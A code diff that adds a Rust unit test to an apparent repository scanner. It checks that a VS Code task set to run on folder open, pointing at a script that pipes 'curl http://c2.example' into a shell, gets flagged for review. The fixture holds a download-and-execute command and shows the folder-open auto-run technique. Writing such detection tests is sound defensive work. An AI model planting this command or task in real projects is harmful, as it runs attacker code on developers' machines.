@@ -450,6 +450,26 @@ mod tests {
     }
 
     #[test]
+    fn a_quick_scan_reads_the_node_file_a_folder_open_task_runs() {
+        let files = vec![
+            file(".vscode/tasks.json", r#"{"tasks":[{"label":"go","command":"node","args":["${workspaceFolder}/scripts/a.js"],"runOptions":{"runOn":"folderOpen"}}]}"#),
+            file("scripts/a.js", "require('child_process').exec('curl http://c2.example | sh');\n"),
+            file("src/other.js", "console.log(1);\n"),
+        ];
+        let r = analyze_files(files, &quick()).unwrap();
+        // The task's file is read and what it does is reported; the unrelated file is only counted.
+        assert_eq!(r.overview.files_analysed, 1);
+        let b = brief(&r);
+        assert_eq!(b.verdict, Verdict::Review);
+        let kinds: Vec<_> = b.reasons.iter().map(|x| x.kind).collect();
+        assert!(kinds.contains(&ReasonKind::AutomaticCommand), "{kinds:?}");
+        assert!(kinds.contains(&ReasonKind::InstallTimeEffect), "{kinds:?}");
+        // A full run reads everything.
+        let full = analyze_files(vec![file("scripts/a.js", "1;\n")], &RunOptions::default()).unwrap();
+        assert_eq!(full.overview.files_analysed, 1);
+    }
+
+    #[test]
     fn a_manual_task_alone_is_listed_but_is_not_a_reason() {
         let files = vec![file(".vscode/tasks.json", r#"{"tasks":[{"label":"m","command":"make"}]}"#)];
         let b = brief(&analyze_files(files, &RunOptions::default()).unwrap());
